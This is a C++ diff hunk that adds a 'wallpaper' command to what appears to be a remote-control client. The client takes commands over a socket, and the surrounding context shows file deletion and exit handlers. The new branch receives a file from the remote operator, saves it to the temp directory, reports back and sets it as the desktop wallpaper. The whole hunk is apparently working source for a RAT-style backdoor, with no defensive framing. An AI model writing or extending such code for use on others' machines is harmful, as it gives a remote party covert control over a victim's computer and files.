@@ -398,6 +398,20 @@ int main(int argc, char* argv[])
                 // delete file
                 // remove(filePath.c_str());
             }
+            else if (command.substr(0, 9) == "wallpaper") {
+                char tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
+
+                std::string file = command.substr(10);
+                std::string filePath = std::string(tempPath) + file;
+                std::string callback = file + " wallpaper changed!";
+                send(s, callback.c_str(), callback.size(), 0);
+                ReceiveFile(s, filePath);
+
+                Sleep(1000);
+
+                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath.c_str(), SPIF_UPDATEINIFILE);
+            }
 
             else if (command == "exit" || command == "quit" || command == "bye") {
                 std::string callback = "Client terminated...";
